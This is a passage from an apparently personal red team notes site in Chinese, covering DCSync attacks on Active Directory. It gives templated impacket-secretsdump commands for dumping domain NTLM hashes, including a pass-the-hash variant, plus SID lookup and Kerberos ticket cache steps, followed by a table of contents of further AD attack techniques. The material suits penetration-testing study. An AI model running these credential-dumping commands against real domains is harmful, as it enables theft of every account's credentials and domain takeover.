secretsdump 利用目錄複製服務遠程協議 (MS-DRSR)，也就是 DCSync 所依賴的協議，來模擬域控制器之間的複製行為，從而請求指定域控制器上的帳戶 NTLM</p>
<ul>
<li>
<p><code>impacket-secretsdump &#x27;&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC_IP_OR_HOSTNAME&gt;&#x27; -just-dc</code>
<img decoding="async" loading="lazy" src="https://hackmd.io/_uploads/ByPu9cEAyx.png" alt="image" class="img_ev3q"></p>
</li>
<li>
<p>or PTH：<code>impacket-secretsdump &#x27;&lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;DC_IP_OR_HOSTNAME&gt;&#x27; -hashes &lt;LM_HASH&gt;:&lt;NTLM_HASH&gt; -just-dc</code></p>
</li>
<li>
<p>SID Extraction：<code>impacket-lookupsid:&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&#x27;&lt;PASSWORD&gt;&#x27;@&lt;DC_IP_OR_HOSTNAME&gt;</code>
<img decoding="async" loading="lazy" src="https://hackmd.io/_uploads/SJMoysEAJg.png" alt="image" class="img_ev3q"></p>
</li>
<li>
<p>需要一個有效的 Kerberos TGT ticket，並將其保存在 ccache)。</p>
<ul>
<li>通常通過 kinit (如果知道密碼或有 keytab) 或其他攻擊手段（如 Kerberoasting）獲得。</li>
<li><code>export KRB5CCNAME=/path/to/your/ticket.ccache</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="attacking-domain-trust">Attacking Domain Trust<a href="#attacking-domain-trust" class="hash-link" aria-label="Direct link to Attacking Domain Trust" title="Direct link to Attacking Domain Trust">​</a></h2></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/category/red-team-紅隊安全"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Red Team 紅隊安全</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/Cyber-Security/Red_Team/Linux_Post_Exploitation"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">紅隊安全 | Linux 後滲透</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#microsoft-ad-訓練課程" class="table-of-contents__link toc-highlight">Microsoft AD 訓練課程</a></li><li><a href="#dc-的功能" class="table-of-contents__link toc-highlight">DC 的功能：</a></li><li><a href="#nmap" class="table-of-contents__link toc-highlight">Nmap</a><ul><li><a href="#常見開放-port-與其對應漏洞" class="table-of-contents__link toc-highlight">常見開放 Port 與其對應漏洞</a></li><li><a href="#nmap-scripting-engine-nse" class="table-of-contents__link toc-highlight">Nmap Scripting Engine (NSE)：</a></li></ul></li><li><a href="#windows-環境下的枚舉" class="table-of-contents__link toc-highlight">Windows 環境下的枚舉</a><ul><li><a href="#powershell-cmdlet" class="table-of-contents__link toc-highlight">PowerShell Cmdlet：</a></li><li><a href="#ldap-" class="table-of-contents__link toc-highlight">LDAP ：</a></li><li><a href="#domain-controller" class="table-of-contents__link toc-highlight">Domain Controller</a></li><li><a href="#powerview" class="table-of-contents__link toc-highlight">Powerview</a></li><li><a href="#smb" class="table-of-contents__link toc-highlight">SMB</a></li><li><a href="#gpo-enumeration" class="table-of-contents__link toc-highlight">GPO enumeration</a></li><li><a href="#getuserspnspy" class="table-of-contents__link toc-highlight">GetUserSPNs[.]py</a></li><li><a href="#kerbrute" class="table-of-contents__link toc-highlight">Kerbrute</a></li><li><a href="#windows-adreconps1" class="table-of-contents__link toc-highlight">Windows ADRecon.ps1</a></li><li><a href="#bloodhoundad" class="table-of-contents__link toc-highlight">BloodHoundAD</a></li></ul></li><li><a href="#smb-1" class="table-of-contents__link toc-highlight">SMB</a><ul><li><a href="#psexec" class="table-of-contents__link toc-highlight">psexec</a></li><li><a href="#cmenxc" class="table-of-contents__link toc-highlight">cme/nxc</a></li><li><a href="#網路芳鄰" class="table-of-contents__link toc-highlight">網路芳鄰</a></li><li><a href="#掛載遠端磁碟" class="table-of-contents__link toc-highlight">掛載遠端磁碟</a></li></ul></li><li><a href="#rdp-遠端桌面" class="table-of-contents__link toc-highlight">RDP 遠端桌面</a><ul><li><a href="#windows" class="table-of-contents__link toc-highlight">Windows</a></li><li><a href="#linux" class="table-of-contents__link toc-highlight">Linux</a></li></ul></li><li><a href="#wmi" class="table-of-contents__link toc-highlight">WMI</a><ul><li><a href="#pass-the-hash" class="table-of-contents__link toc-highlight">Pass the Hash</a></li></ul></li><li><a href="#winrm" class="table-of-contents__link toc-highlight">WINRM</a><ul><li><a href="#powershell-remotingwindows-remote-management" class="table-of-contents__link toc-highlight">PowerShell Remoting(Windows Remote Management)</a></li></ul></li><li><a href="#dcom" class="table-of-contents__link toc-highlight">DCOM</a></li><li><a href="#ssh" class="table-of-contents__link toc-highlight">SSH</a></li><li><a href="#mssql" class="table-of-contents__link toc-highlight">MSSQL</a></li><li><a href="#exchange" class="table-of-contents__link toc-highlight">Exchange</a></li><li><a href="#sccm" class="table-of-contents__link toc-highlight">SCCM</a></li><li><a href="#llmnr--nbt-ns-poisoning" class="table-of-contents__link toc-highlight">LLMNR &amp; NBT-NS Poisoning</a><ul><li><a href="#linux-1" class="table-of-contents__link toc-highlight">Linux</a></li><li><a href="#windows-1" class="table-of-contents__link toc-highlight">Windows</a></li></ul></li><li><a href="#krbrelayup" class="table-of-contents__link toc-highlight">KrbRelayUp</a></li><li><a href="#davrelayup" class="table-of-contents__link toc-highlight">DavRelayUp</a></li><li><a href="#password-spraying密碼噴灑" class="table-of-contents__link toc-highlight">Password Spraying(密碼噴灑)</a><ul><li><a href="#linux-2" class="table-of-contents__link toc-highlight">Linux</a></li><li><a href="#windows-2" class="table-of-contents__link toc-highlight">Windows</a></li></ul></li><li><a href="#smb-relay--ntlm-relay" class="table-of-contents__link toc-highlight">SMB Relay / NTLM Relay</a></li><li><a href="#kerberoasting" class="table-of-contents__link toc-highlight">Kerberoasting</a></li><li><a href="#as-rep-roasting" class="table-of-contents__link toc-highlight">AS-REP Roasting</a></li><li><a href="#kerberos-delegation" class="table-of-contents__link toc-highlight">Kerberos Delegation</a></li><li><a href="#acl-abuse" class="table-of-contents__link toc-highlight">ACL Abuse</a><ul><li><a href="#acl-enum" class="table-of-contents__link toc-highlight">ACL Enum</a></li></ul></li><li><a href="#dcsync" class="table-of-contents__link toc-highlight">DcSync</a><ul><li><a href="#dumping-hash" class="table-of-contents__link toc-highlight">Dumping Hash</a></li><li><a href="#generating-golden-ticket" class="table-of-contents__link toc-highlight">Generating Golden ticket</a></li></ul></li><li><a href="#attacking-domain-trust" class="table-of-contents__link toc-highlight">Attacking Domain Trust</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/docs/intro">Notes</a></li></ul></div><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/jonafk555" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>